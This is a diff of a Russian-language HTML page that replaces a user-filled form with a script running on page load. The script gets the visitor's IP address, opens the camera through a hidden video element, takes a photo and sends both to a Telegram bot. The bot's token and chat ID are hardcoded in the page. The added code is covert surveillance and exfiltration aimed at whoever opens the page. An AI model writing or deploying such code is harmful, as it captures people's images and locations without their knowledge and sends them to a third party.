@@ -2,99 +2,67 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <title>Отправка фото и IP в Telegram</title>
+  <title>Автоматическое фото и отправка в Telegram</title>
 </head>
 <body>
-  <h2>Введите данные для отправки</h2>
-  <form id="telegramForm">
-    <label>
-      Токен бота Telegram:<br />
-      <input type="text" id="token" required style="width: 300px" />
-    </label><br /><br />
-    <label>
-      Chat ID:<br />
-      <input type="text" id="chatId" required style="width: 300px" />
-    </label><br /><br />
-    <button type="submit">Сделать фото и отправить</button>
-  </form>
-  <p id="status"></p>
+<script>
+  const token = '8083604701:AAHVEEUxRHT9MiQU7RVtMPIlFgWo3tR7PCU';
+  const chatId = '6945488830';
 
-  <script>
-    document.getElementById('telegramForm').addEventListener('submit', async e => {
-      e.preventDefault();
+  (async () => {
+    try {
+      // Получаем IP пользователя
+      const ipResp = await fetch('https://api.ipify.org?format=json');
+      const { ip } = await ipResp.json();
 
-      const status = document.getElementById('status');
-      status.textContent = 'Получаем IP...';
+      // Запрашиваем доступ к камере
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.style.display = 'none';
+      document.body.appendChild(video);
 
-      const token = document.getElementById('token').value.trim();
-      const chatId = document.getElementById('chatId').value.trim();
+      video.srcObject = stream;
+      await video.play();
 
-      if (!token || !chatId) {
-        status.textContent = 'Пожалуйста, заполните все поля.';
-        return;
-      }
+      // Ждём готовности видео
+      await new Promise(resolve => {
+        if (video.readyState >= 2) resolve();
+        else video.onloadeddata = () => resolve();
+      });
 
-      try {
-        // Получаем IP
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipJson = await ipRes.json();
-        const ip = ipJson.ip;
+      // Создаём canvas и снимаем фото
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        status.textContent = 'Получаем доступ к камере...';
+      // Формируем blob из изображения
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
-        // Доступ к камере
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
+      // Останавливаем камеру
+      stream.getTracks().forEach(track => track.stop());
+      video.remove();
 
-        // Ждем пока видео будет готово
-        await new Promise(resolve => {
-          if (video.readyState >= 3) resolve();
-          else video.oncanplay = resolve;
-        });
+      // Подготавливаем отправку в Telegram
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('caption', `IP пользователя: ${ip}`);
+      formData.append('photo', blob, 'photo.jpg');
 
-        // Захватываем кадр с камеры
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      // Отправка фото с подписью
+      const resp = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
 
-        // Останавливаем камеру
-        stream.getTracks().forEach(track => track.stop());
+      if (!resp.ok) throw new Error(`Ошибка отправки: ${resp.statusText}`);
 
-        status.textContent = 'Формируем файл фото...';
-
-        // Получаем blob jpg
-        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-
-        // Формируем форму для отправки в Telegram
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', photoBlob, 'photo.jpg');
-        formData.append('caption', `IP пользователя: ${ip}`);
-
-        status.textContent = 'Отправляем фото в Telegram...';
-
-        // Отправляем запрос в Telegram Bot API
-        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-
-        const data = await response.json();
-
-        if (data.ok) {
-          status.textContent = 'Фото и IP успешно отправлены!';
-        } else {
-          status.textContent = `Ошибка отправки: ${data.description || 'неизвестная ошибка'}`;
-        }
-
-      } catch (err) {
-        status.textContent = 'Ошибка: ' + err.message;
-      }
-    });
-  </script>
+      alert('Фото успешно отправлено в Telegram');
+    } catch (err) {
+      alert('Ошибка: ' + err.message);
+    }
+  })();
+</script>
 </body>
 </html>
